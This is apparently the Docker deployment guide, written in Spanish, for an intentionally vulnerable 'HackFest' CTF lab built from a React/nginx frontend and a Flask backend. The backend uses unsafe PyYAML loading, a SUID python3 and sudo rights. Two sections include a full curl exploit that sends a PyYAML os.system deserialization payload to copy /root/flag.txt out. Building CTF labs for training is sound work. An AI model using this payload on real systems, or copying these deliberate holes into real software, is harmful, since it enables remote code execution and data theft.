# 🐳 Docker Configuration - HackFest CTF

## 📋 **Resumen**

Esta aplicación está completamente dockerizada con una arquitectura de microservicios que incluye:

- **Frontend**: React + Vite servido por nginx
- **Backend**: Flask con vulnerabilidades PyYAML RCE
- **Proxy reverso**: nginx para enrutar peticiones

## 🏗️ **Arquitectura**

```
Cliente → Frontend (nginx:80) → Backend (flask:5000)
           ↓
    Puerto 3000 (público)
```

## 📁 **Estructura de Archivos Docker**

```
hackfest/
├── docker-compose.yml          # Orquestación de servicios
├── DOCKER.md                   # Documentación Docker
├── backend/
│   ├── Dockerfile             # Imagen backend con vulnerabilidades
│   ├── app.py                 # Aplicación Flask
│   └── requirements.txt       # Dependencias Python
└── frontend/
    ├── Dockerfile             # Build multi-stage con nginx
    ├── nginx.conf             # Configuración proxy
    ├── package.json           # Dependencias React
    └── src/                   # Código fuente frontend
```

## 🔧 **Configuración Docker Compose**

### **Services**
- **backend**:
  - Build: `./backend`
  - Puerto interno: 5000
  - Usuario: hackfest (non-root)
  - Vulnerabilidades: PyYAML RCE + python3 SUID

- **frontend**:
  - Build: `./frontend` (multi-stage)
  - Puerto público: 3000 → 80
  - Proxy reverso a backend
  - Sirve archivos estáticos React

### **Networking**
- Red interna: `hackfest-network`
- Solo frontend expuesto públicamente

## 🚀 **Comandos de Despliegue**

### **Desarrollo**
```bash
# Construcción y despliegue
sudo docker-compose up -d

# Ver logs
sudo docker-compose logs -f

# Reconstruir servicios
sudo docker-compose build

# Detener servicios
sudo docker-compose down
```

### **Producción**
```bash
# Reconstruir desde cero
sudo docker-compose down -v
sudo docker-compose build --no-cache
sudo docker-compose up -d
```

## 🔒 **Configuración de Seguridad**

### **Backend (Intencionalmente Vulnerable)**
- PyYAML con `UnsafeLoader`
- python3 con bit SUID
- Usuario hackfest con sudo privileges
- Flag protegida en `/root/flag.txt`

### **Frontend (Seguro)**
- nginx con configuración hardened
- Headers de seguridad implementados
- Solo proxy autorizado al backend

## 🌐 **Configuración Nginx**

### **Rutas Proxy**
- `/api/*` → backend:5000/api/
- `/config` → backend:5000/config
- `/uploads/*` → backend:5000/uploads/

### **Archivos Estáticos**
- `/` → Aplicación React SPA
- Fallback a `index.html` para routing

## 📊 **Verificación del Despliegue**

### **Health Checks**
```bash
# Frontend funcionando
curl -s http://localhost:3000 | head -5

# Backend API funcionando
curl -s http://localhost:3000/api/system | jq .

# Endpoint vulnerable activo
curl -s -X POST http://localhost:3000/config \
  -H "Content-Type: application/x-yaml" \
  -d "test: value"
```

### **CTF Funcionando**
```bash
# Exploit completo
curl -s -X POST http://localhost:3000/config \
  -H "Content-Type: application/x-yaml" \
  -d $'!!python/object/apply:os.system\n- python3 -c "import os; os.system(\'cp /root/flag.txt /app/static/flag.txt\')"' \
  && curl -s http://localhost:3000/uploads/flag.txt
```

## 🔄 **Solución de Problemas**

### **Errores Comunes**
1. **Puerto 3000 ocupado**: Cambiar puerto en docker-compose.yml
2. **Containers en conflicto**: `sudo docker-compose down -v`
3. **Build cache**: `sudo docker-compose build --no-cache`

### **Logs de Debugging**
```bash
# Logs específicos
sudo docker-compose logs backend
sudo docker-compose logs frontend

# Logs en tiempo real
sudo docker-compose logs -f
```

## 📦 **Imágenes Docker**

### **Frontend**
- Base: `node:18-alpine` (build) + `nginx:alpine` (runtime)
- Tamaño: ~50MB
- Tiempo build: ~30 segundos

### **Backend**
- Base: `python:3.9-slim`
- Tamaño: ~200MB
- Tiempo build: ~60 segundos

## 🎯 **Endpoints Disponibles**

| Endpoint | Método | Descripción |
|----------|--------|-------------|
| `/` | GET | Frontend React |
| `/api/system` | GET | Información del sistema |
| `/config` | POST | Endpoint vulnerable (PyYAML RCE) |
| `/uploads/flag.txt` | GET | Flag exfiltrada |

## 🧹 **Limpieza y Optimización**

### **Archivos Docker Necesarios**
- ✅ `docker-compose.yml` - Orquestación principal
- ✅ `backend/Dockerfile` - Imagen backend
- ✅ `frontend/Dockerfile` - Imagen frontend
- ✅ `frontend/nginx.conf` - Configuración proxy

### **Archivos Eliminados**
- ❌ `Dockerfile` (raíz) - Duplicado innecesario

## ✅ **Verificación Final**

```bash
# 1. Servicios activos
docker ps

# 2. Frontend accesible
curl -s http://localhost:3000 | grep -o '<title>.*</title>'

# 3. Backend proxy funcionando
curl -s http://localhost:3000/api/system | jq .user

# 4. CTF completable
curl -s -X POST http://localhost:3000/config \
  -H "Content-Type: application/x-yaml" \
  -d $'!!python/object/apply:os.system\n- python3 -c "import os; os.system(\'cp /root/flag.txt /app/static/flag.txt\')"' \
  && curl -s http://localhost:3000/uploads/flag.txt | grep HACKFEST
```

## 🏆 **Estado: ✅ COMPLETAMENTE OPTIMIZADO**

- ✅ Frontend React dockerizado
- ✅ Backend Flask dockerizado
- ✅ Proxy nginx configurado
- ✅ CTF challenge operativo
- ✅ Despliegue con docker-compose
- ✅ Documentación completa
- ✅ **Configuración Docker limpia y optimizada**
